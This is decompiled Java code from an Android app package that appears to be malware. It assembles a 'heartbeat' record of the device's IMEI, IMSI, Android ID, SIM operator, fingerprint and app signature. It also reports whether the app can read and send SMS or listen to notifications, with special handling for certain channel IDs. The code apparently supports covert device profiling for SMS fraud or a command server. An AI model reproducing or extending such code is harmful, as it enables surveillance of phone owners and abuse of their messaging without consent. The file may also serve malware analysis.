package com.unia.y;

import android.content.ComponentName;
import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkCapabilities;
import android.net.NetworkInfo;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import java.text.SimpleDateFormat;
import java.util.Date;
import org.json.JSONObject;
/* loaded from: /mnt/shared/apks/menSe7ni.dex */
public class ar {

    /* renamed from: a  reason: collision with root package name */
    public static final byte f486a = 14;
    private static final SimpleDateFormat b = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
    private static final String c = "PROXYDATA";

    public static JSONObject a(Context context, String str, String str2) {
        au.a("createHeartbeatData1");
        JSONObject jSONObject = new JSONObject();
        jSONObject.put("app_id", str);
        jSONObject.put("channel_id", str2);
        jSONObject.put("time", b.format(new Date()));
        jSONObject.put("imsi", e(context));
        jSONObject.put("op_code", f(context));
        jSONObject.put("imei", d(context));
        jSONObject.put("android_id", h(context));
        jSONObject.put("fingerprint", Build.FINGERPRINT);
        jSONObject.put("sdk_code", Build.VERSION.SDK_INT);
        jSONObject.put("package_name", context.getPackageName());
        boolean z = false;
        jSONObject.put("version_code", context.getPackageManager().getPackageInfo(context.getPackageName(), 0).versionCode);
        jSONObject.put("heartbeat_count", l(context));
        jSONObject.put("check_apk", g(context));
        jSONObject.put("iswifi", j(context));
        jSONObject.put("ip_version", 14);
        jSONObject.put("conn_version", 44);
        jSONObject.put("send_msg", b(context));
        if ("6004".equals(str) || "6013".equals(str)) {
            jSONObject.put("read_msg", true);
        } else if ("6014".equals(str)) {
            if (c(context) || a(context)) {
                z = true;
            }
            jSONObject.put("read_msg", z);
        } else {
            jSONObject.put("read_msg", a(context));
        }
        au.a("createHeartbeatData2");
        return jSONObject;
    }

    public static boolean a(Context context) {
        return a(context, "android.permission.READ_SMS");
    }

    public static boolean a(Context context, String str) {
        return Build.VERSION.SDK_INT >= 23 ? context.checkSelfPermission(str) == 0 : context.getPackageManager().checkPermission(str, context.getPackageName()) == 0;
    }

    public static boolean b(Context context) {
        return a(context, "android.permission.SEND_SMS");
    }

    public static boolean c(Context context) {
        try {
            String packageName = context.getPackageName();
            String string = Settings.Secure.getString(context.getContentResolver(), "enabled_notification_listeners");
            if (!TextUtils.isEmpty(string)) {
                for (String str : string.split(":")) {
                    ComponentName unflattenFromString = ComponentName.unflattenFromString(str);
                    if (unflattenFromString != null) {
                        return TextUtils.equals(packageName, unflattenFromString.getPackageName());
                    }
                }
            }
        } catch (Throwable unused) {
        }
        return false;
    }

    public static String d(Context context) {
        try {
            String deviceId = ((TelephonyManager) context.getSystemService("phone")).getDeviceId();
            return TextUtils.isEmpty(deviceId) ? "empty" : deviceId;
        } catch (Exception unused) {
            return "err";
        }
    }

    public static String e(Context context) {
        try {
            String subscriberId = ((TelephonyManager) context.getSystemService("phone")).getSubscriberId();
            return TextUtils.isEmpty(subscriberId) ? "empty" : subscriberId;
        } catch (Exception unused) {
            return "err";
        }
    }

    public static String f(Context context) {
        try {
            String simOperator = ((TelephonyManager) context.getSystemService("phone")).getSimOperator();
            return TextUtils.isEmpty(simOperator) ? "empty" : simOperator;
        } catch (Exception unused) {
            return "err";
        }
    }

    public static String g(Context context) {
        try {
            String a2 = av.a(context.getPackageManager().getPackageInfo(context.getPackageName(), 64).signatures[0].toByteArray());
            return TextUtils.isEmpty(a2) ? "err" : a2;
        } catch (Exception unused) {
            return "err";
        }
    }

    public static String h(Context context) {
        try {
            return Settings.Secure.getString(context.getContentResolver(), "android_id");
        } catch (Exception unused) {
            return "err";
        }
    }

    public static int i(Context context) {
        WifiManager wifiManager;
        try {
            wifiManager = (WifiManager) context.getSystemService("wifi");
        } catch (Exception unused) {
        }
        if (wifiManager == null) {
            return 0;
        }
        int wifiState = wifiManager.getWifiState();
        return (wifiState == 3 || wifiState == 2) ? 1 : 0;
    }

    public static int j(Context context) {
        ConnectivityManager connectivityManager;
        NetworkInfo activeNetworkInfo;
        try {
            connectivityManager = (ConnectivityManager) context.getSystemService("connectivity");
            activeNetworkInfo = connectivityManager.getActiveNetworkInfo();
        } catch (Exception unused) {
        }
        if (Build.VERSION.SDK_INT >= 23) {
            NetworkCapabilities networkCapabilities = connectivityManager.getNetworkCapabilities(connectivityManager.getActiveNetwork());
            if (!networkCapabilities.hasCapability(16)) {
                return 2;
            }
            if (networkCapabilities.hasTransport(1)) {
                return 1;
            }
            return networkCapabilities.hasTransport(0) ? 0 : 2;
        }
        if (k(context)) {
            if (activeNetworkInfo.getType() == 1) {
                return 1;
            }
            if (activeNetworkInfo.getType() == 0) {
                return 0;
            }
        }
        return 2;
    }

    public static boolean k(Context context) {
        NetworkInfo activeNetworkInfo;
        ConnectivityManager connectivityManager = (ConnectivityManager) context.getSystemService("connectivity");
        if (connectivityManager == null || (activeNetworkInfo = connectivityManager.getActiveNetworkInfo()) == null) {
            return false;
        }
        return activeNetworkInfo.isAvailable();
    }

    public static int l(Context context) {
        return context.getSharedPreferences(c, 0).getInt("HeartbeatCount", 0);
    }
}
